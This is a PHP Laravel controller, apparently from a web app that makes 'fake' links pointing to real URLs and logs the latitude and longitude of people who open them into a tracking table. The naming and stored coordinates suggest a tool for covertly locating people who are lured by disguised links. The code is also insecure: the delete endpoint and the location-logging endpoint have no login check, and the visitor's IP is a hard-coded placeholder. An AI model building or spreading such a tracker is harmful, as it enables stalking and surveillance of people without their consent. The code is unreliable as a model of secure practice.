<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\Models\Link;
use App\Http\Controllers\geoPlugin;
use App\Models\Track;

use DB;

class LinkController extends Controller
{



    public function createlink()
    {
        $as = session('user');
        if ($as==false){

             return redirect('/login');
        }
        return view('createlink');

    }

    public function listview()
    {
        $as = session('user');
        if ($as==false){

            return redirect('/login');
       }
       $getdata = DB::table('links')->paginate(20);
       return view('linklist',compact('getdata'));


    }


    public function viewlink()

    {
        $as = session('user');
         if ($as==false){

             return redirect('/login');
        }
        $getdata = DB::table('links')
        ->join('tracks', 'links.fake_link', '=', 'tracks.fake_link')->orderBy('tracks.id', 'desc')->paginate(20);
        return view('userlink',compact('getdata'));
    }


    public function removetrack(Request $request)
    {

        $link = Track::where('id', '=',$request->input('id'))->delete();
         return redirect()->back()->with('success','successfully Removed');
    }

    public function createnewlink(Request $request)
    {


        if(isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on')
        $urls = "https://";
   else
        $urls = "http://";
        $urls.= $_SERVER['HTTP_HOST'];



         $request->validate([
            'fake_link' => 'required|unique:links',
            'real_link' => 'required',
            'title' => 'required|unique:links',


        ]);

        $getlink = DB::table('links')->insert([

          'fake_link'=>$request->input('fake_link'),
          'real_link'=>$request->input('real_link'),
          'title'=>$request->input('title')


      ]);
      if ($getlink) {
        return back()
            ->with('success','Your Now Link Created Successfully')
            ->with('fake_link',$urls.'/'.$request->input('fake_link'));
      }
      else{
        return back()->with('fail','Something wrong');
      }
    }
    public function fixedlink(Request $request,$id)
    {
        $link = Link::where('fake_link', '=',$id)->first();

        if ($link) {

            return view('user',compact('link'));
        }
    }
    public function fixedlinks(Request $request)
    {

       $sendlink = DB::table('tracks')->insert([
            'iplocation'=>'192.168.0.1',
            'long'=>$request->input('long'),
            'lat'=>$request->input('lat'),
            'fake_link'=>$request->input('fake_link')
        ]);

}
 
}
